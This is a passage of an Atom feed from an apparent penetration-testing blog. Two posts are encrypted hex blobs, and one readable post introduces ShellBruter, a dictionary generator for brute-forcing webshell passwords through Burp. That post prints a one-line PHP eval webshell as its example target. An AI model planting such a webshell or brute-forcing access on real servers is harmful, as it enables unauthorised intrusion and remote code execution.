    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="3eb3e9b5e848ad470c7847b253b803e1b52a31113781c8bd051e187b73bf0fed">a5c035cac555b5d84b40189f163d299485d2426daf76f5d717527c9819aab9d53c945bbbf7401f72e2d0405b27521554af47798fa71ad36dc71c69bf94567a19c48cb3acde1fe8628488f25e1c0252bfd3c67f21bae6d3d80289fb2686e5800a1108c5e8da5fd954b38e2ec65cec8c0525e9fda4d21991be3da60f51a005723e10484fc90551275312e0dd1d16525cca1d7045d10bcdc2724695f228aa5690da496bca88b086430dfdaf3c196cb605995602d35ff3ee341925245cf56dbc6fc9267124ae9459e23e42e76d4c809fc6cae6080f3aaefb1196e6f901f23a2c83f9a86eab27a2ca376a01e45fa22869cbf005117f0bd2c20128d48d642e0718cb7456abbe918ecacbbf00a62c13caf63eba6ad99e93ad18686fb11116e4ed72a345db1a667c10f2867f52f9df509d442fa1aaaa01b3eaec87a3002a373db3c252fa9f995e7f9d3ade86230087a47279859eb156875d304578dfbef1931d56eecb88d98e2b64302f8dbafe7ab55598d4567428faf8a55e32daf778ef0d06b7cd75a048128e70e3381e0bd6b9ed4196dfff22b8547343636bcbfd2e1670c768e877acd24ad7401594e08efda25bad2bbd97e406d4999905a640381ddf5159444c444d5d9eefa3e134df39790680dd0811d013907cd69667799f64c69c21aadee8bd67d11f15b99c1fcb5cb229d5b59621ed973d83661621fa6b513dafc3e36ed4445bd4ae193ec244bc1418c322c76d2fd8f0a70f24495bbb1f0b568a0de103b449b870f876783b7f1ad75aebc484de3064d2e07df2ed8a0d9439ab39f43e70414e953ff023108621fa15eaa723cf6670f1a71d9f69fa7d8c3b53ed414d67502db6a51d7665c6984bd2240e39337e9e7fdbc5607abddb892af082c5ee23874565a94a122e08e548be422e2ad78c7b8137c1e3908a8cccea2795a9d8a0c54eb013816793539d2016f3d070e8424f42755ef5837a7bcbe9f210616e905c359b3fc1528674a30c0cdd9ff0a0e04f4dfd92ec2af9b5c4d3a2e31cdee4d04987d1ab9d80543bc53e23d0d94e547f12810c231a2f3c2ad913beae5c4f968266bb611083f5de65e7faab4aa4f69f1d3cc33cc51a54a818cef54dd0da26c1cda669fda3c7ba2880515ac2badf58f0258318f28ba89408c165316ab19f6ea2d597a6c9f6d9984bded09d3ed373cc8dd290e886af03eec0f7caf1259beee932399da03b2a64ddb6c962c441003880680b8af18d7005f500bfc610f6b306b016b1299d5a61c1569421f91e71b904fb5345df5e7ccaac6bfef544f13eacb17e3870b2be6d2be4b75908f6aa59261e8281a5e55ce2a4168c0b0a5c82e1b888df31f09ebb13ae3a5d93036f19eb00d32b99e1e8b56e36409110015d742aa5a3ccc6b6ab85dbf928de4709169201be2f3fccb4518db5cbb391258c98dae245205182e06469d6d5e6417dfe9b510a08dee13a23c4985bb913be78064ba29ccbe6eaab3553ac87be7f9a27678ace173fcc5f3a97cfb8bead3298bfbac505281c5faf9acc3b637e5df444d908742cc987bdf1a9911be2bbb344dd0cd0d81063a14a0b20a1e49c0fd33b6f64bd813021d2649dd16146219c8309a2f9d060dcd850e3e31e22ce2ba6be55126f795fdfcd3e25efb58d58e4ce684c2aaa56a963bcd9a85ad0344c856d0a086587563a17dd893a429aad283598cf2462bbfed90d422e1a4edc0535eab0bb1ce951c3e820b152ff58d3c5ab82bf04b542029e33bcd144e1d9ea1f79ef1eca48d9a975ae4f6543b4bb96556f99933e3f6b0b92a2888f87f0a800578eff2205597f5417f5e86557c6b094eb941b7dd5bfe1636ce13c6060150edb92ce357db278baa0073e2eabd29cf7f479d36bd0c60971be90c3b32931badb9139d69ac910686ed30e1238171f13acbf42d97b5485830495704824f08a8b2eeff2ef7b9f5d7cb51390a66fb96260dd9cdc6592aa9ede80ac6eb2102878ccdf480f0aec1f7311c9e3fa77a83b4c0e9cfed26c119823776ff3bdf6fc899a9746f2af4a64b4a7fc6f80f158976d44dbf2ef0553d702f3e11305da4a81a2297389619621caefde94578fe17d8bf74ce16603fffc233250e15512d2c61b7cf9931bb54cc7905629cc8398e95483e37505f28fc3fe19fbfb5cbb874565d5de37b34d68f326ccf4482693d8d849c1390ff00719e2702548614e251b8791a10c31f458131196a1d98334d4e5b94d19c0775309044fbb444a180c181f64b770b5ee33766f56ecfa1a066eab2742eab31126ea11008a0d74a77e8655abdf64e8380c53dfbbbd5c8bae8583f0de3be99aa2cb5187aa0f8040df42b9b27562ccd05bb710c86a7e0ac9ea52053459109bf6f48a8f191b2df8d0d29cf3f86956a3133c8a32d8ff388387136e255fa10d43724b2616499741444a168e3d463f3620de20db59f7100c027611d6c8dddc7b2183ac9c9aa17ac88c7b90f823508766fec039ead67ccc630dcc1a9cb64cb4c1ea61e38c77364f623942107ea217733a83f8582c4377181403d3244cf5108dc2b24ca8f67dedc5ff4e1204767127e181ed8ab50a48ac14962950c586f43c8b5fb91b72b3973e253e4b17c542990d3700544078ab038462f09428aa2e1f916c8d8135b3e0e653d4000e2485dd351a41310aea7889b53ff8f53050798051eb145c2bc01d2691952be7a2fdcd7eb28bd4e7fbb7b109f770232dc8337763b7b141f47d38fd1f92d11cd69e59afde96a5312606c9b9df04c51d5346dbec87a885edeca0e3fe4feb134c3f22908213b25af5a5be2d8b137dc21aafec3ce3330d9544f1cb449f6045515f171ada9de1640a09129a24d7011b91113aff4a024bc26acb1270ee2288b17eaeade69d713fdd05ff11180b63caf08f55ff3a12c6b0302a1fde96304e70370161a9f31e5a043b7720c081bcbaf89be4b37ca945dbdfde98892f8b55611fde1a0c6735a3fef519dd8d4fc985e214acaa301a326670a888c4b3fa1d1d391ed100e37d8a9c71ae802fa694d9575967e34d162479045762cf02d1e91d65a92a918fdd8cfa0be7e0e4c0dc3d40734cf2d927b098a6a699124518ef3cb6945050b827c3e11195522ab45eaf54288e09c5558020baffaa3ab62c960c7852fd3706312b3d7d5fc5f549fae72ceeeb30dec613f22116e4d15d5b1383a0395f4eeaac3a8e73164a29ba68a80594e0abdd6c5552037fe115b5646e4da9476a3744e7c575d6ffc4d22519ef8c6087630ad324d78854d121942fb0701f8ed4f8905c94f543e3b0b4e829e783fc2e5e3f756cc4207d4859802963c8a14ee62d86669576831cec9ff367a9c70974c1b91fb4d249335c4e74c2a72af99596af0d961b3525ced4dfcc6390555a064d3abcde66145bdaac227ab81cbdf6e857a246ae63da60d462d956f6c06dbc040aeb7c040b74817d946334852b3e5d5458a31ef3136a4ec05ca1de1bf20e2e3675009c38060fc2306ebca4daa082f687d118a6d5d60f539becb02e5069f917ba8f4824c04fb989ba8c8ba9414c9bdb080e50fe6cfadb86e161170db94e2910a989be7a5b308d65881e53be700e0f828f196d7a531034df3411c0b22ff3646d1dd8bb7610ed6164b3ca4c785b79e8457b5f840ca1e877c996b9e8e482a3447dcbc0fc2294fb30aafec7800d8cd84d4fc06dfbb2ec7e3826f0c06fb6e861c371e65fe3f53f90735933283e843aeb0d06cf7d13554cfbae4be8b4421c31261be10cb283f91d525951724aed4c52ded0533c766b71b73e415901806088a2cd9c3d69063b1a0a376518c90db9538987cae38ecf2d731f35981dfa44311d2931e19ac0a1ad6a038a433ec86ccbceeb4f403d95fad072836070b20223bc45bfb011066ec023b6e6727874516ca2466f26fcf6f0bcb31d2b87c7e5161e82005bf3ca8e784d11e62926848967724f7ab3e547eb5eb701215c3f4fa32e8b8b1ef9b3627eae10d1190ebfd8d8188b57bd1de83244f641172b3d20eeeb8e1b7189c4cb402e21117779a630b7e0f0df0b5776baeeee6a44d2b3fbfce9ace9c4c4f725b20266d2d4ad1559942827176e0399403ca23d6ec8d4dc51d5b7525f8457c88e8db103d87e03bb39b69aeb5a11cdc109626eb952478b96d7d6203928b4a0d265932c98015099ce2c4ea689846497602729a6ea99fca0440b2d12517121b1faedd38470a3b3602d24f4092dacb63892975a9d9876b05186d2503c090a95e4bac3f9ab7fe07a27590eab83a9f876f1717c01f5843e3d24eb2a5dde796bafa93a54dc773edb88ec20e645526bb003660e2b571e9b278770b8dddb1d6cd7fe6033392a3751918f65102ca95ee43d23787d9b1c8efd881a5797c83961f24cdb4f0165cd8c3f4abcd63bd0649b883f7bfb7c24f5259d5974989d84a4503b6102342361fcf19ccd5dc210e9d2fa9ef05615697e87dcf0f7d698ba6a184a721b31df92c10cc16d3be87c8e01a8a2dc0c6d702b86f4065ec5bce5cede2163d39d8665a01dfc0f4699360aec0c667e9d6fb9d23eceb70f2f1b0f93eb46fb97e61d1b81c91821c1efde727e65f7ed7b7f709db96eef49f063b0fcddfb8d26f2dc65e17b503550b6f562f832f0be2595f869e6b8820e0923f7766645d441f8119ab3ddd6fafba4dffd9daa7a37b8c2c57742b2020c2a7c564fab4253702b138701317e9cb5a24723493a023518532d0a956053ec000bb628edd428abe3594bde57bce832fb7e74fd19dc24cba710bdc8900168460f8b0a8c1a6e081dda75ab2b2fbe9af8785a55356026f7514bc06d39a4778bb35b13d49528dd0338f04dd872efec574442e89392d5e3b5d54cc82c6e223138515fb17a38d9753148fc3a65e77edef6864046f4785926ba7cdd59933286dc2e6b931468acf1edfa93c78231703a10c5eff14c0087dd3a20138e26c8f394ae81afdcb9c641417b3ea0516f77de787178240979457d25892422e98d8396512ca0b4947ba8c39a138c43e7feabcd405b5e162906024843c12c9fb4656435027309b05b5454bf4bfd55806312ee7f54275622dd4da6164e46b584aca7abd78d130f98a8de15f76bfbfd5be047e5e4d13c1b566db2d9a1a1fb89490f8f5e934de1cb2b89ea4faae8f372d6e67eca336475791b813e337051dbb56791cb244fa0582bc2e9c1a5c403a0cb3ae5f1a74a585d9761d6dd0456a53cf12d5efe7e77a476af77641cc63d96f9ce78f9d481c2cf03513c255e03000587b028d224b510c32186c0fef97c4d7fa6b68fb5a4bd156cc32281968ad09b8da5cb7e979dab89ae46b62bef83dfc51398575a33c6a448c455710c41eafbd0574e3198bf67bd705b7fe8b1c1ec3f0f2fe841dff9bfaa8b0e0f9f9ce243198e58cba7be58fba9ab4bc34a955fd35bde5c5c29a1974b99fc2198bb9979ca85ea1120bd476d9053c86eea56f709fbb0dc07a015e526ab2eae00d9a286e81ed909e96deea9a122e3b8a2ed3d4fe13ee1f3306f4a10d39be0cdf918c14e08744ec3dec9bf16aeab2930871147172262c143e606145c2501fff8590221ce806139e9d10f7afebcf22f31bdb6d61da8c02f922148261dcd1ec29ea013798eb45259cc12fdafa9002c92d50e12ffe63ed45d7b22b7357ce06a1ba4ac4106dc010b0b0048bcd07306cbed76cf278cadecda0b5deda613614759ec3984513ede309d7b4ee1aa5bf3d047bacc44a0aeae33edf2da70b35f19d2cf6d81c6b5979a2b8009fad9d2da1e128be7af99eaf78849150044bdd62c9d74250e236a22e01666907cfd8b74d095deea905626536853063d3d1d75944e88dd2e5a8415323cd9682fef1426231a543854637598aa26ed1b33a7ee6bb8f0369234399871675a3397eca2b9a53685a19713790840763e2f4f9bb08eaeefe4205b72ee9c6ed826e75a5d3a0865e4ba164d62bc3095d1984bd0ab416e8781b6958041f97c03693b715d5bdb9d7e6510ab8653fd5b589eb7548f3f7bdbb9e5b41b51f634ceb534d7064d6b011ba03caf3ebfcfe94373ec9b59a655d3bdacee9d2dd26e30a8e64231a82d8655aa1b264d9ef2dd22c7c429953e2ee5e6ca5c28b74d0d3fe67c48a952453c1cbe5621eb4db8ad7e7897108f1f8c665426999c482aa8485a485aeb809bfa55024a0d0eff6052d0179f2e61bc4f3f5a49f8e8a94c827b8b84385a7346585e6b611f8a7ff14b5013c3687de151b2dfb22f5cdacb97aac6ab0f353f9ad6f128705250dbffaae014ec1adec558a2b02c440aa8651d72c3bfc9940d3f913addff45bf4b635d38d0b041b8742adf2454e80dbd0e66492bc738245688a5e089f1b93db516449b07bb78ec21a140de6f62f83119b4620c1c2885696762f83aaf4cbf45a9fdb918fa0a929c804d41eb719efcdc4421bb8b60b57fb450130257312e3f4e5006165b8747069849c50b02f5c73e093fcc3fb91abf773469dda6322dcc42ce4436f7e2be70b2ed9724610181fca8e2a2af8f9c03b6501344027c92092fe7114f6f02de94522003d537439340871361b3ffb8168621cd6d352716c212436b07fdfd164a53851678696c152a03121e9c2dd298878c92433aed881dbe42c8592772fe0039d1f1f117c2e92f059f26a0d925d79c4d258bc110ace2d95cd49fe05f50c8227776dde17518e7ff8f968e01469043942fcd6ed48215765cf151aa3336067dba3fe4ea41da24e106388a33c957933f61d5bd9e77a77fd62d20cce9ba03e860d0fc49996ab5aa96d0a6628721f28d67969581d7f9a3060182f5d159de1dee89c43eacf23360f91b38728f98d46e712e3284e51813ebe7abd8dc4c6a189cc4920bb57f69a13ce3bd97dc0d34881dce6fa746be91c0a784204a197520632a3db786da32da19b05093f9192226ed30a0e441e47e4d8b7592878c61e2e50948a5c0f17d0421b59f8140ba5ab8e270276ff14e0b409046b25dbd7c1a39b826eec903c4b072ac3b09c02584ce0e2b3d2424d441583d1c290a70d07b15b4fcb405bda5c9e18bd80f98d1237e48b59ad35ebf6ca87d651afda8998c96d986ae3af32f729bb45c0565d143be34df7096669ad73e35f4a0bc2bc3bec31b8e32627bc2882fa878d30ad4dfb5f1017f2bf42057b499b165d0c61a8c5a8fbaa95f248a63875371d8660c755c38acb5987880121f47d8daf50a4b4ab2e9c7d60191b0cf555b5aa445ed4a7858aee9c60d5d320b61fa5d494c7dcbf1f5aa32d791129b749c07d69a3137c47db10ad775b58c533561d04572571c9f482f5f88896c31383593624341574460f17933174a0813be615f29e503bc3770279f06fe8f17152911ff8b877e6d98fbc8326a8bbe05a0f49b1bd8bb4bc4e20b1be43d76b5af38fb4520da18bba349f85cb2fb7d6a298cc5568c5b7e370b4a782b0825abd0bbad3ee36f509f75038c00bca3babb8cf777918e3fc8730da85981c4b4eda44d3f25be8c2159453d4ab1a3672b46abff607c22131a003914b2815bdb510a4d20f67126602302f8e0b361bdae2bebac100d62a5e9e0e953518d52d7f0d72b7652a6a8caf5c6d33a673c52ebf866cca96e17e997d80f4ed64076c9f0c7c709e92b505989197963de7bfd6473cc8388e8ae04918606e41687689b4917bd12f8bab2b4bde79d16d7fd296cffab65bb951f3d38c89c061783b34c539b73a06c30691ffa3ee90f7da71ca1f965c30ed6a6801d12e6f3a6be6e8a6ed568a152005f9bd1acb45a2775711542c9b4d5b00d1cfe34f7a8dc754de293f8d99dfd436ebf80cf1a997f7d0848d66bd5c4e023235473c61f5c6b54be745d1962b45d9672aa3268bcf389d98f96a46275caa3101d6ad465412ca649aeeab570861d54a2c27f971abe6c811912f08ea7df7c54b00a6c2c1abf274e90090a7fb298efb5d03939c286e4b954dd1b629f47fcfaae567ce0e15cafbe6f5e6799e5a4c98588c9dfa60e5e512b7fce75d70c70b80388bed4879bd442219e347a7307025d50b0b374a83f4f88f8ce7559547c7e08b181cf5193e150359df9d1ab3430ccd84e7125fd4055d6c40f220a299cc3644d347fbd94c13aadd001c8671d101f29194405de79c0fc20cc80676a9b9e58f644052163d2d0c38c8e37802ca8166c938b279d8ef65c717438a01bd6756f20907201ccc0e469e843f601597fbd6e0ef86f1ddfc44d21d92b868032b25e01d9ee0e24da504cd2970c459abc0e9c180bcd7f2fa8cd0eeddb16652a3644c56074d88fca7f00de56b1bee46038a793971a469a3e274a0d0f223f3e302c33c9a673ed3ad0267d3b8c9456207497d190e953402167e8c3f14f7fbcbd89ebd29d75ddfcf6e463922f5a68f6b8a3645400506ee52f1fa7701817f690c7a15ac074b131aa503410189908cf41158b8e7eee1bf27a79a7fc85ff574237d64d09b075a76fb94a343a4174e5785d7523db82dbf9a69773f6b8f481d5e1ad581ffa8498f2766e0ff7b4fd575527d3b2021f11706f7e90747f1ec5771eaad3c05daa9230693267b7e8e85904973df5e302e68b2e9d7764576e9d14e95cf8c110a88607ae405eb1f1bc0a9c315c5ce89a6f4fbb8764d65a2077ebecf46ca55d2ece830e6b32350e69f9abb5e85a5baa6d67a9abb9d1c340ce4037a2aea17fe41e79049056a432e2b3ab771a8c10726964c081753a61b0194fd81d32062bb6cc07471ecb4d2a898f86ced8506cbd423c48058b83972e1026c943122c9329064e7888b6d19caa205436db7fd9618bb5c36f331c47a1d41b063f850782e7c92798b6ba94a29212f64e9fddaffda5bfd9f209117e3ecd49a8b17c347f4209286c1bf01c92723e44b403f2655111260606f646d765d07661866f45bdd19bba7581f2eef157e44883fe34bd7aa0c8dc5475d05d4358fed5df66cd1bfa0d284d8df2506c109218db06865b82703e9756a65203bc96f82c2c6d664be9942ceb4c22e9bf86f13cf2f2500b8878c6ef15bdb61923f9e35f45d7e742bfd32c2908fe12944b17a4575c867d58171057605ec2739173e6ec8930c5fb216422ad6f00c993637f69a0aa64c4cd510c18bc29dd85165c53c6ea01c4e3fffa3cdccec176b4b0cb9c76e1611ad0b5a07a5027521a75c74788c477f8bb7ee6b157d396fcba329c7c74430e1ab1aa1e3ddd513234a16b945195c291e3b0d5fbf0ec5563d2501335fabd747054e04c4e60c30c798a4881a3bdc44f11c278b54c9fb94e32d29c6a9e941a109bd879476492335b9636ed9a8048b07572ce87663107874fbaa10811a591e26ff2e2b0b6d0c08e5e7f4ae017b7f4a4d08a16fdd949c0c7cf51f3afc71862b1929463a146e742519aee4ed65168beb530c4f48bb1a8b005f78e9fa6d5427d592fee3927d7d027ec201ef6850e68480298352d56dafd32b338238fb3cdbcf47c36eb68757021eb8020e9a4cbb15b3c344c75f32095e7dcc4054713a0ef430b884e126a3e3889f58714481b4ca87f865afeee733c37cb6c1566d2829f1d5f72507f4dfc0e14227b6c2eff067a231311531d157d5baa49f6ab258e911b8716b2a9ddbb69cc1ce7966cdfdea8d81827bf9058d485a1794359fcb1328dcd036f5df442b9cce7b6eb9d9e770bccb649b06332af937f43e7ec7a6f070f4a50c03914a3295f272b50ae021a16b0d87ae1951333e875e3ec7537faa0824d392c3b4257fc4cc48714cf969d663feae0d58a0f1f337cc958298f433a3033a7070b3ada87c8f42a42d6c561a12b8a44ff941795f63efca7e9f7e081309648596ba2c6d2a8d2d08b8ceb8c459bcb2316b7f4b6254ddf37d70a554b41780458b7e9c8020f383b77118c541b24f12fcf6c4e0ba030066eb9d736f3f46f7f1236ac8f6f720738c08c297802588ba79fedb412237ea93d5a0291c9b23db24aa8052c778b63d18ac85ad95983ef8add72b254dbb81e90e7732471a5902321f02d71171cc79c02595ef0d9adeb6db06a50bd7f6b021616a14c0dc67aa045655aaa7c76b2103bb7503bb0f6d65519039e824f7855c7c7f28790cc630695bfc4a7fb17c743fe690128caede59898dfd873712442c5c25941acbd6b1a8d8be04e9cc895ca813443ed1eebb5d2a6c58f5ed78a049c0549365221ac284e883d274bf29ba01c949f3c5cf5207925e4606701bbba52ee155ab2fe91fecad97c10437a4bee1db0d17e444ff6098000fe2c8fcbdc526cde35e1254c7c265a40c94e4d14c1acb8bd46773665da825c4aa0d2c1f285b6863b6e66d7bf686e84543266a0d5c420e6b4e0a49e97ad9140ea0751aba72e07ac0458301c70a86d8bf4622fa2958ab3e53a1972b8377fe431c76c750fcb3ff10e56de4e7a40381dbe52d0b95ab81f23d1dc321cd77883cc89732206c8b258806f5787f55c30d4734e0c25555ab75ba3c343ed54d7d5dd23cbb19c0e72b2b2f5c5276dd38a379f206319a13717ff44da8149848dbe72cac7932db95919d95eeaebcc3524732233913924eeb07f0d35b0da91d30bba447952d796ce71868f77e5d86c56ca7ba0aa8f3a5e76e670aea6014d678717796ebec0ee94b1d19fefd864d769fcc813476dce0439dd4216807de93aebab8f83d0192b7387b93672f972e1c547c41365349d030bbd2cac44d5f3c659dcff0457234dca3c5c2fb5e091999e27fa3180bb2d4eb73741aef13202e526c2ec807ae5008adea38ab259cc59831b76f1655ec6fc2d47ae2930038101ec55c301c017b5dd73fa1cf7f45e007e1fa6c42d5d7c2067b8b8582f3a363a55971702f9e67d42</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="一星期实战总结" scheme="https://www.se7ensec.cn/tags/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>ShellBruter|WebShell高效爆破字典生成</title>
    <link href="https://www.se7ensec.cn/2020/03/22/ShellBruter/"/>
    <id>https://www.se7ensec.cn/2020/03/22/ShellBruter/</id>
    <published>2020-03-22T13:30:24.000Z</published>
    <updated>2021-01-23T14:13:50.671Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>江湖人称轮子妈。</p></blockquote><a id="more"></a><p>爆破思路参考：</p><p><a href="https://www.t00ls.net/thread-36985-1-1.html">https://www.t00ls.net/thread-36985-1-1.html</a> </p><p>这里不继续用python写请求的原因是感觉让burp处理这些会更好（懒）</p><p>使用示例：</p><p>假设当前shell为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[a]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1）burp加载生成的爆破字典</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.03.23/1.png"></p><p>2）关闭URL编码（很重要）</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.03.23/2.png"></p><p>3）得到结果</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.03.23/3.png"></p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.03.23/4.png"></p><p>此方法可灵活使用，其余可自由发挥。</p><p>github地址：</p><p><a href="https://github.com/r00tSe7en/ShellBruter">https://github.com/r00tSe7en/ShellBruter</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;江湖人称轮子妈。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="暴力破解" scheme="https://www.se7ensec.cn/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="Python" scheme="https://www.se7ensec.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>一星期实战总结（二）</title>
    <link href="https://www.se7ensec.cn/2020/02/24/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%932/"/>
    <id>https://www.se7ensec.cn/2020/02/24/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%932/</id>
    <published>2020-02-24T14:30:24.000Z</published>
    <updated>2021-01-23T14:13:50.647Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="3e934de1af7c062d3dbab76ffdde74c24949249a83b7e6f23f9066a69e6228d2">f376b327ec9ddf8aacfd0f5a171ed67d407954dfe8ab6d9ffbe53c6d5fdb3d1b7f52d3d4cde99e102a996afe01bcef8e55c3ff1d4fe4461c3131b2c0f633a9c0cb66850aeff8ab5b57b56f71a5c81cf8944a4d2938779a23d9b42976566d501d29f638c6b29b7a5119f1340eb1d2c5dd034edd43cb76a68d589dd5acfe9e5b3d836ba211dd7bb1d1cb79f9711f34dd5c13c6e9cdbc58a14c8971ce30eadadfa29913470627f49a74d9c99fd6770a8768bc5c721567576b4f14704f2ce377a05612af82fade86f3d9ec5e7fb7676a1362c0540b2b255f68dc4247aaf582e4fb56bb14f5e42f3a7e0aabbaad389e6f51a47963d2efb7e6668cb60ab920a69883c020562b29b1adb9fc2528907534b673be603251e91a64f93bb87c9302cc1a94db553dee9016d1a11fb84e1abf46523f6dbbe8842e228988a9366f841894b7b0ba3cc59050c00919b599025c5e2bb82c19ea9eb0d3582bb8d41af52e30871a52a28f78710127650c56657d480bcfc4193bc8d201f4ce65fcab0008a9c709feece80a998957a8933ada37ca1b3c10f50aa4700ab0728143dff212e1d7683e60ab165488f4168eb488159d8c2baa9942a6e0a20bf5fc75759fc06716ae03cb8bb309b1515bb4874ca59ddc2fb76dabe242e2259750f91ca7448f1bf75c67dc9a469c985678d86e5888da3a474404f64cb9d16d5e21e481224f7ba6a9d041012bf362638e1fa08a25ce2154c36b0afe96a058f901618146de60d53de9e3b969229f75750dac4884ce04e9b2fb3d6f9d321bf90bf0858a3175dbfd7f31bc01eaaf99630c077904a24b999bc580d0775ef6af63e19a4c5e7587b0c85a3b4d91b737b69ecebf7a7a305f72dcaf0a68c37491c4e9c4c23f2722a1cd7ccf68131f98bc2aa05c926668a33a7b79fa86fd5fb29d41b6b878371d357ed92d2516fce823198fc91b7b65e41a5c544b805a1339ff1fc680774803f613992e5117c0edfaa07eba0134d229bfdc1af6d4afc0f2f9c2ab41222f2ee9f6e8d7913beb94ca6c147d1d7bf690e1b6eef822e52d6f5347bb925dd21fe1ae218ef90b232d6592158ae3499d38d1604f3bbcbeb040dd7218f6db40408e9e5fb764255e03aeb3919d0fc8928764514c1a91077aec384ff63cd1012dae0a3fdae91bddd02f10baa1644f252aca3724bdcb5b00af66f9599033787efbc33b8f9bd501ac786e5ce924a931207249a41e1b6a09c66c967de84f3760223de281d94db8342bd222b48952d8b89bc5ee14538ef09d2aae256a5072ea8806ea51deb59a7359a770b89423d679a0a6da96360d5f08eac0045124df3a3acde67261a318a31b47eda3ed9ff24110acadf7911f758a8b4277de5cdbe8db36c0725457a850d6273482e2d03ba425dab1c16186fc8bf25a033067289718b5b75aaad5ee4b0470128d9ea1deeb0610577a6adcb2eb266b1ac1acd33f1d39dfec553da11532253d8ef9890968bcfb7686ace231db8e9d47653fd281b0dda091517611f70700a342b6f8b00605d5f1324bcbb50438d60b034379f4bdeeabb110323331d3a161e8e342a4beb42518d63878545540e4fc670cf9cf4ad6d18c823cf6cf514d3bb929dee05054df6cc6de9c17517dbd6577914c05ffb4678544b3cef43d7fde23141afc082c607c84e8cb6a968817f2f6d02b507ddafc832a26f6513021c7cd2293ebeea465f440a33b2db4fe87ae67a9225ffee24430b9a4fbde6e9204489abe45055ec1fbb419c48f11dd2dc47a530fde0d564ef44e96d708fc7dffcc6c29deebc68dca431b934cd406d8740d3785fe203422e0355914433e2c310e1d7f1e961658ee1ea950ec1e1ac0aa809f6fc11af12ed82a950b554b2cb2525b5b310beb4ad925784b81da2657c60557a292bdf5242faf3bcaa37e5e5e1667d9e373b720e994fe77d4859e732d1e9f4118b3e0a2212378335f85768addb07751a453683155a1ceae7a690a8bba1aef046f797edab2a5cb15df8a98ac9e2d00ffa772ce456751a77799bf257f728463b6c1de739c97f4fe18c4c369c7513d86bd751bf8b4a501d53cca1312dc669126df33fe4ffa362aedc47d89d467d4993da92d8359de3e16c83060968607246a84448cae7fadd5a21c5bb988abe0e37fb2f181f87579db91be9fa45ba98fa867fe6e55906a25019cae6d7c3f6641aab2de9764a07ff413ece36ee54aa0b1269aafa9a25392748a8c02ee5129010abfe9870bc1c35bd8f5914a814a93ccff09994831d358e9ec7aee734e6bf40c9c17e43d39318361e3b713ee63af6bbad0d2fa6a5240cefcf26df0a2828eaf52d745b9e588f35f25a786dd00fdc4b34989b4fd996e2f53605bdc9f3fdbdd9a9292f7a7497f279d6d58e9e18d4819867206cdc527f5ccd15b011946a36668f86f9e6e9ed14a35a695cbc21ceac5eadfc89874f07bd737af193cf3d0fef18886108b97cc154673484ca47a08673693e618766d8bcf2f44a78287d40d57972ae255fb7ba2ff827ec6395b76df711cbff61a781a755251a103b640e156a932dadda13be4ed8ed7ca1b37f0c580aae3b3bb2d7049018bb03674f621be8a71f7bb0ec1ef628f4b57f5af3a516119558a099d76f8bd2acd341cf12b1d516f926b6e5a5605d9245ef6e6507ae52601ce74b34c7ff2f1fa75a14eceba5afd58c41444993e42707cdf05730d9ab7c5ea2a7f3f75a99ef3ed03d9800e9f7c30edd52ac1b273cfc83e1157ddbb330915e45f8b1e5ea022e40c4a2c22028ec634b172127909accd69a9b5241e572b57d021bf3d3d629efb236cbcfefd15226c4f2a2bae87f7d08051e3243d60ef8092a3950b555df9b4b61d477e5cd92baeadf087cd8d0cf82fc4102e9e53ede6a0c978fee2f538e9dcb220223edb9401ce9007473704740793cf180c8b8cfa40a7197b2c33ba8fca54f89564d5f1415cdd8bca2f52163173f54eb365459f8fb1463cb478ebf419a2d9d54d01798c5209cedec6114e43d36ee42ddd70f363485c1dd19988e9e7e74289d63b49d65a5b323866ed69b8b701c517aa9a90e74b92c30cd6e18636d2eba8312a63ea2938ad5d849d93e589877474035651402058d9e3ff8b58c1e0898cf25788fe42d87583f9dda763f3090c0d1b41ed873e832b938b567e07911ccfc960e45c0c69ebf4f1ea619e790e98efb5f51d9deab0b0ace68194a9d8fabaf9f290da4a9e48445880fd00528ea486516b195d28c757a9be81000a543b4cd449e1468be6d8887af3cc47c994d8b48eea5b844d942cb07528279865a13bbbe8d1a5e65bd332b45af2522ecfec9f75c55743237624a326956e5d56d2f3075517a4f4962acc371cfe1c0e7361eea932ec7fd61903df422f6cb638ee47b2453e887d23a7efe4334ae